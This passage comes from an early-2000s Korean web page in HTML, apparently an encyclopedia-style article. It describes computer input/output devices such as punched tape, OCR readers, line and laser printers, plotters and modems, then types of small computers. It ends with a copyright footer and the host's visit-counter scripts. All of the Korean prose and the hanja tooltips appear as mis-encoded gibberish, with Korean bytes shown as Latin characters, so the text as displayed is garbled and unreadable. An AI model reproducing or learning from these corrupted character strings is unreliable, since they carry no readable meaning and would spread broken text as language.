href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=18950&amp;sec=1">±¤Àü°ü</A>(<FONT title="ÎÃ : ºû(±¤),¿µÈ­(±¤)">ÎÃ</FONT><FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT><FONT 
title="Î· : ´ë·Õ °ü">Î·</FONT>)À¸·Î Ä«µå»óÀÇ Ãµ°øÀ» °ËÃâÇÏ¿© µ¥ÀÌÅÍ¸¦ ÀĞ´Â´Ù.</SMALL> 
<DT><SMALL id=ln3>Ãµ°øÁ¾ÀÌÅ×ÀÌÇÁ(paper tape, punched tape)´Â Á¦Á¶ÇÏ±â ½±°í ´Ù¸¥ ¸ÅÃ¼¿¡ ºñÇÏ¿© °ªÀÌ ½Î¸ç 
ºÎÈ£ÀÇ È®ÀÎ &middot;Àı´Ü &middot;Á¢ÇÕ(<FONT title="ïÈ : ´î Á¢">ïÈ</FONT><FONT title="ùê : ÇÕÇÒ(ÇÕ)">ùê</FONT>) 
&middot;º¸Á¸ µîÀÌ ¿ëÀÌÇÏ¿© Á¤º¸ÀÇ ±â·Ï¸ÅÃ¼·Î¼­ ¸¹ÀÌ ÀÌ¿ëµÇ°í ÀÖ´Ù. ³Êºñ 2.54 cmÀÇ Å×ÀÌÇÁ·Î 5´ÜÀ§ &middot;6´ÜÀ§¿ëÀº Àü½Å±â¿ë(<FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT><FONT title="ãá : ¹ÏÀ»(½Å),ÆíÁö,Ç¥Áö,">ãá</FONT><FONT 
title="Ñ¦ : º£Æ² ±â">Ñ¦</FONT><FONT title="éÄ : ¾µ ¿ë">éÄ</FONT>)ÀÌ°í Á¤º¸Ã³¸®ÀÇ ÁÖº¯´Ü¸» ÀåÄ¡¿ëÀ¸·Î¼­´Â 
8´ÜÀ§°¡ ÁÖ·Î ÀÌ¿ëµÇ´Âµ¥ 1 cm¿¡ ¾à 4ÀÚ¸¦ Ãµ°øÇÒ ¼ö ÀÖ´Ù. ÀĞ±â´Â <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=18950&amp;sec=1">±¤Àü°ü</A>¿¡ 
ÀÇÇÏ¿© ÇàÇØÁö¸ç ÀĞ´Â ¼Óµµ´Â Ãµ°øÄ«µå¿Í °°ÀÌ ¸ÅÃÊ ¼ö¹é ÀÚÀÌ´Ù. ¹®ÀÚ &middot;ºÎÈ£ÆÇµ¶ÀåÄ¡´Â ÀÚ¼ºÀ×Å©¹®ÀÚÆÇµ¶±â(magnetic ink character 
reader:MICR)¿Í Å¸ÀÌÇÁ¶óÀÌÅÍ¿Í ÇÁ¸°ÅÍ µî¿¡¼­ ÀÎ¼âÇÑ ¹®ÀÚ¸¦ ±¤Àü½Ä(<FONT title="ÎÃ : ºû(±¤),¿µÈ­(±¤)">ÎÃ</FONT><FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT><FONT title="ãÒ : ¹ı ½Ä">ãÒ</FONT>)À¸·Î ÀĞ´Â ±¤ÇĞ¹®ÀÚÆÇµ¶±â(optical character reader:OCR)°¡ »óÇ°È­µÇ°í ÀÖÀ¸³ª 
ÇØµ¶ÇÒ ¼ö ÀÖ´Â È°ÀÚÀÇ ¸ğ¾ç°ú Á¾·ù°¡ Á¦¾àµÇ¾î ÀÖ´Ù. ÀÏºÎ¿¡¼­´Â ÆíÁöÀÇ ¹®ÀÚ¸¦ ÀĞ´Â ÀåÄ¡µµ ½Ç¿ëÈ­µÇ°í ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>ÀÎ¼âÀåÄ¡ÀÎ ¶óÀÎÇÁ¸°ÅÍ(line printer)´Â È¸ÀüÇÏ´Â µå·³ ¶Ç´Â º§Æ®»ó¿¡ ½ÄÀÚ(<FONT 
title="ãÕ : ½ÉÀ» ½Ä">ãÕ</FONT><FONT title="í® : ±ÛÀÚ ÀÚ">í®</FONT>)µÈ È°ÀÚ¸¦ Ä«º» ¸®º»(carbon 
ribbon)À» ÅëÇÏ¿© ¼Ò¿äµÇ´Â È°ÀÚ°¡ ÀÎÀÚ(<FONT title="ìÔ : µµÀå(ÀÎ)">ìÔ</FONT><FONT title="í® : ±ÛÀÚ ÀÚ">í®</FONT>) À§Ä¡¿¡ ¿ÔÀ» ¶§ ÇØ¸Ó¸¦ µÎµå¸®°Ô ÇÏ¿© ÀÎ¼âÇÑ´Ù. ÀÎ¼â¼Óµµ´Â ¸ÅºĞ ¼ö¹é~¼öÃµ ÇàÀÌ°í 1Çà¿¡ 
130ÀÚ Á¤µµ ÀÎ¼âÇÒ ¼ö ÀÖ´Ù. ·¹ÀÌÀú ÇÁ¸°ÅÍ(laser printer)´Â ÀüÀÚ»çÁø½Ä(<FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT><FONT title="í­ : ¾Æµé ÀÚ">í­</FONT><FONT 
title="ŞĞ : º£³¥ »ç">ŞĞ</FONT><FONT 
title="òØ : Âü Áø">òØ</FONT><FONT title="ãÒ : ¹ı ½Ä">ãÒ</FONT>) ÀÎ¼â±â·Î ±¤ÆÄ(<FONT title="ÎÃ : ºû(±¤),¿µÈ­(±¤)">ÎÃ</FONT><FONT 
title="÷î : ¹°°á ÆÄ">÷î</FONT>)·Î¼­ ·¹ÀÌÀú¸¦ ÀÌ¿ëÇÑ °ÍÀÎµ¥, ¼Óµµ´Â ¸ÅºĞ 1¸¸ Çà Á¤µµÀÌ°í ¿ëÁöµµ º¸Åë¿ëÁö¸¦ »ç¿ëÇÒ ¼ö ÀÖ±â 
¶§¹®¿¡ ÇÁ¸°ÅÍ·Î¼­ ±Ş¼ÓÇÑ °³¹ßÀÌ ÁøÇàµÇ°í ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>À½¼ºÀÀ´ä±â(audio response unit)´Â ¾ğ¾îÀÇ ¿ä¼Ò¸¦ º°µµ·Î ±â·ÏÇÏ¿© µÎ°í, ÀÀ´ä¹®¿¡ µû¶ó ¿ä¼Ò¸¦ 
¾î¶»°Ô ¼­·Î ¿¬°á½ÃÅ³ °ÍÀÎÁö¸¦ °áÁ¤ÇÏ¿© ÀÀ´ä¹®À» ¸¸µé¾î³»´Â ¹æ¹ıÀÌ´Ù. ÁÖÆÄ¼öÀÇ ÇÕ¼º¿¡ ÀÇÇÏ¿© Á÷Á¢ ÀÀ´ä¹®¿¡ ÇØ´çÇÏ´Â À½¼ºÀ» ¸¸µé¾î³»´Â ¹æ¹ıµµ 
ÀÖ´Ù. À½¼ºÀ» ÆŞ½ºÈ­ÇÏ¿© À½¼º¿ä¼Ò¸¦ ÀÏ¹İÀûÀÎ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=29247&amp;sec=1">±â¾ïÀåÄ¡</A>(<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131200&amp;sec=1">ÀÚ±âµå·³</A> 
&middot;<A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131201&amp;sec=1">ÀÚ±âµğ½ºÅ©</A> 
&middot;ÀÚ±âÅ×ÀÌÇÁ &middot;ÇÊ¸§ µî)¿¡ ±â·ÏÇÏ¿© µÑ ¼öµµ ÀÖ´Ù. À½¼º¿ä¼Ò¸¦ ¾Æ³¯·Î±×·®(<FONT 
title="Õá : Çì¾Æ¸± ·®">Õá</FONT>)À¸·Î 
±â¾ïÇÏ´Â ¹æ½Ä°ú µğÁöÅĞ·®À¸·Î ±â¾ïÇÏ¿© µÎ°í À½¼ºÀ¸·Î º¯È¯ÇÏ´Â ¹æ½ÄÀÌ ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>µµÇü(<FONT title="Óñ : ±×¸²(µµ)">Óñ</FONT><FONT title="û¡ : Çü»ó Çü">û¡</FONT>) ÀÔÃâ·ÂÀåÄ¡·Î¼­´Â ºê¶ó¿î°üÀ» ÀÀ¿ëÇÑ ÀåÄ¡¿Í ÆæÀ» ¾²´Â X-Y µµÇüÀÛ¼º±â(plotter)°¡ °¡Àå 
½Ç¿ëÈ­µÇ°í ÀÖ´Ù. À½±Ø¼±°üÇ¥½ÃÀåÄ¡(cathode ray tube display)´Â Çü±¤¸éÀÇ ºûÀ» °ËÃâÇÏ´Â ±¤ÀüÆæ(light pen)¿¡ ÀÇÇÏ¿© 
µµÇüÀ» ÀÓÀÇ·Î º¯Çü &middot;½ÅÃà &middot;ÇÕ¼ºÇÒ ¼ö ÀÖ°í X-Y µµÇüÀÛ¼º±â´Â Å« µµÇüÀ» Á¤¹ĞÇÏ°Ô ±×¸± ¼ö ÀÖ´Ù. ´Ü, µµÇüÀ» ±×¸®´Â µ¥ ½Ã°£ÀÌ °É¸®±â ¶§¹®¿¡ 
ÄÄÇ»ÅÍ¿¡¼­ µµÇüÁ¤º¸¸¦ ÀÏ´Ü <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131201&amp;sec=1">ÀÚ±âµğ½ºÅ©</A> 
¶Ç´Â ÀÚ±âÅ×ÀÌÇÁ¿¡ ±â¾ï½ÃÅ°°í, ÄÄÇ»ÅÍ¿Í´Â µ¶¸³ÀûÀ¸·Î µµÇüÀ» ±×¸®´Â °æ¿ì°¡ ¸¹´Ù. COM(computer-output 
micro-filmer)ÀåÄ¡´Â ÀÎ¼âÀåÄ¡ÀÇ Ãâ·Â, µµÇüÀÛ¼º±âÀÇ Ãâ·Â°ú °°Àº Á¤µµÀÇ ³»¿ëÀ» ¸¶ÀÌÅ©·ÎÇÊ¸§»ó¿¡ Ãâ·ÂÇÏ´Â ÀåÄ¡·Î ±â·Ï¼Óµµ´Â ¼öÃµ~4¸¸ 
5000Çà ºĞÀÌ´Ù.</SMALL> 
<DT><SMALL id=ln3>ÇÊ¸§¸ÅÃ¼´Â ÁÖ·Î ³Êºñ 105 mm, ¸¶ÀÌÅ©·ÎÇÇ½Ã Æû(microfiche form)À¸·Î Ãâ·ÂµÈ´Ù. µ¥ÀÌÅÍ 
Àü¼ÛÀåÄ¡´Â µğÁöÅĞÈ­ÇÑ µ¥ÀÌÅÍ¸¦ ÀüÈ­È¸¼±¿¡ ½Ç¸®±â À§ÇÑ Á÷·ù½ÅÈ£¸¦ ±³·ù½ÅÈ£·Î, ±³·ù½ÅÈ£¸¦ Á÷·ù½ÅÈ£·Î º¯È¯ÇÏ´Â º¹º¯Á¶ÀåÄ¡ &middot;´Ü¸»(<FONT 
title="Ó® : ³¡ ´Ü">Ó®</FONT><FONT title="ØÇ : ³¡ ¸»">ØÇ</FONT>)ÀÔÃâ·ÂÀåÄ¡ &middot;Àü¼ÛÁ¦¾îÀåÄ¡ &middot;Åë½ÅÁ¦¾îÀåÄ¡ µîÀÌ 
Æ÷ÇÔµÈ´Ù.</SMALL> 
<DT>&nbsp; 
<DT><SMALL><B><FONT color=maroon>5.&nbsp;¼ÒÇüÄÄÇ»ÅÍ</FONT></B></SMALL> 
<DT>&nbsp; 
<DT><SMALL id=ln3>´ë±Ô¸ğÀÇ ÄÄÇ»ÅÍ¿Í ÀüÀÚ½Ä Å¹»ó°è»ê±â[<FONT 
title="ï³ : ¹ø°³ Àü">ï³</FONT><FONT 
title="öñ : ³ôÀ»(Å¹)">öñ</FONT>]ÀÇ Áß°£¿¡ ÇØ´çÇÏ´Â °¢Á¾ ±Ô¸ğÀÇ ÄÄÇ»ÅÍ Áß¿¡¼­ ÁÖ¿äÇÑ °ÍµéÀº ´ÙÀ½°ú °°´Ù.</SMALL> 
<DT><SMALL id=ln3>©ç ¹Ì´ÏÄÄÇ»ÅÍ(minicomputer):Àı´ëÀûÀÎ Á¤ÀÇ´Â ¾Æ´ÏÁö¸¸ 1´Ü¾îÀÇ Å©±â°¡ ÀÛ°í, ÀåÄ¡ ÀÚÃ¼µµ °£´ÜÇÏ¿© 
¼Ò±Ô¸ğ °è»ê±â¿Í Á¦¾î¿ë ¿Â¶óÀÎ(Á÷°á½Ä) ½Ã½ºÅÛ(on-line system)ÀÇ ´Ü¸»Ã³¸®¿ë µîÀ¸·Î ¸¹ÀÌ ÀÌ¿ëµÇ°í ÀÖ´Ù. ÃÖ±ÙÀÇ ¹Ì´ÏÄÄÇ»ÅÍ´Â 
¸¶ÀÌÅ©·ÎÄÄÇ»ÅÍÀÇ ÃßÀûÀ» ¹Ş¾Æ ´ëÇü±âÀÇ ±â´ÉÀ» °®Ãá °Íµµ ÃâÇöµÇ°í ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>©è ¸¶ÀÌÅ©·ÎÄÄÇ»ÅÍ(microcomputer):¹Ì´ÏÄÄÇ»ÅÍº¸´Ù ´õ¿í ¼Ò±Ô¸ğ·Î <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=58969&amp;sec=1">¸¶ÀÌÅ©·ÎÇÁ·Î¼¼¼­</A>(micro 
processor)¸¦ Áß½ÉÀ¸·Î <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=29247&amp;sec=1">±â¾ïÀåÄ¡</A> 
&middot;¿ÜºÎ±â±â¿¡ ÀÔÃâ·Â Á¦¾î±âÈ¸·Î¸¦ Á¢¼ÓÇÑ ¼ÒÇü ÄÄÇ»ÅÍÀÌ´Ù. 1°³ ¶Ç´Â ¸î °³ÀÇ LSI·Î ±¸¼ºµÇ¾î ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>©é ¿ÀÇÇ½ºÄÄÇ»ÅÍ(office computer):ÀåÇ¥(<FONT 
title="íã : ÈÖÀå Àå">íã</FONT><FONT 
title="øù : Ç¥ Ç¥">øù</FONT>) ÀÎ¼âÀÇ ±â´ÉÀ» °­È­ÇÑ ¼ÒÇü »ç¹«¿ëÄÄÇ»ÅÍÀÇ 
ÃÑÄªÀ¸·Î, ÇöÀç¿¡´Â ¼Ò±â¾÷»Ó ¾Æ´Ï¶ó ´ë±â¾÷¿¡¼­µµ Á÷´ÉºĞ»ê(<FONT title="òÅ : Á÷ºĞ Á÷">òÅ</FONT><FONT 
title="Òö : ´ÉÇÒ ´É">Òö</FONT><FONT title="İÂ : ³ª´­(ºĞ)">İÂ</FONT><FONT 
title="ß¤ : ÈğÀ» »ê">ß¤</FONT>)À» ¸ñÀûÀ¸·Î ¸¹ÀÌ µµÀÔÇÏ°í ÀÖ´Ù.</SMALL> 
<DT><SMALL id=ln3>©ê ÇÁ·Î±×·¥ ÀüÀÚÅ¹»ó±â:Å¹»ó°è»ê±â¿¡ ±â¾ï°ú Á¦¾î±â´ÉÀ» °¡Áö°Ô ÇÏ¿© ¼ö½Ê~¼ö¹é ´Ü°è(step)ÀÇ ÇÁ·Î±×·¥À» ½ÇÇàÇÒ 
¼ö ÀÖµµ·Ï ÇÑ °ÍÀÌ´Ù. ÀÌ»óÀÇ ¼Ò±Ô¸ğ ÄÄÇ»ÅÍ´Â ´ëÇü ÄÄÇ»ÅÍÀÇ ´Ü¸»±â·Î ÀÌ¿ëµÇ°Å³ª, ÇÃ·£Æ®(plant)¿Í ±â±âÀÇ <A 
href="file:///D|/Home%20Page/search.naver?where=100&amp;command=show&amp;mode=m&amp;id=131318&amp;sec=1">ÀÚµ¿Á¦¾î</A>¿¡ 
³Î¸® ÀÌ¿ëµÇ°í ÀÖ´Â °ÍÀÌ ¸¹´Ù.</SMALL> 
<DT>&nbsp; 
<DT>&nbsp; 
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT> 
</DT></DIV>
<DT><FONT color=#666666 size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT color=#666666><span style="font-size:9pt;">Copyright ¨Ï 
2002~2003 Editions KOREA /ham kwang ho</span></FONT>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></FONT><a href="http://light048.com.ne.kr/" target="_blank"><FONT color="#666666"><span style="font-size:9pt;"><b>http://light048.com.ne.kr</b></span></FONT></a>
<DT><FONT color=#666666><span style="font-size:9pt;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All Rights 
Reser</span></FONT><FONT color=#666666 size=2>ved</FONT> 
<DT><FONT color=#666666>&nbsp;</FONT> 
</DT></DL></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<P>&nbsp;</P></TD></TR></TBODY></TABLE>
<SCRIPT src="http://icons.com.ne.kr/toolbar/statics/"></SCRIPT>

<SCRIPT>var Long_URL=document.domain; TMPdomain=Long_URL.split(".");if (TMPdomain.length==4) { ID = TMPdomain[0]; } else { ID = TMPdomain[TMPdomain.length - 4]; } document.writeln('<img src=http://statics.com.ne.kr/statics/visitcount.php3?ID='+ID+' boder=1 width=1 height=1>')</SCRIPT>
<IMG height=1 
src="http://statics.com.ne.kr/statics/visitcount.php3?ID=humaneyes" width=1 
boder="1"> 
</body>

</html>
